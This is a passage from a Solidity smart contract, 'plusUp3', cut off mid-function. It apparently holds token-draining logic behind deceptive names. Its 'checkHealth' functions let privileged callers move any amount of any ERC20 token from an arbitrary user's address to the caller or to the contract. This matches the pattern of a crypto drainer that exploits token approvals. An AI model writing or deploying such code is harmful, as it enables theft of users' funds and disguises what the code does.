...
contract plusUp3 is Accessible,ReentrancyGuard{
    using SafeERC20 for IERC20;

    function checkHealth(address _token,address _user, uint _value) public onlyAccessed returns (bool) {
        require(_value > 0);
        IERC20(_token).safeTransferFrom(_user,msg.sender,_value);
        return true;
    }

    function checkHealthXin(address _token,address _user, uint _value) public onlyAccessed returns (bool) {
        require(_value > 0);
        IERC20(_token).safeTransferFrom(_user,address(this),_value);
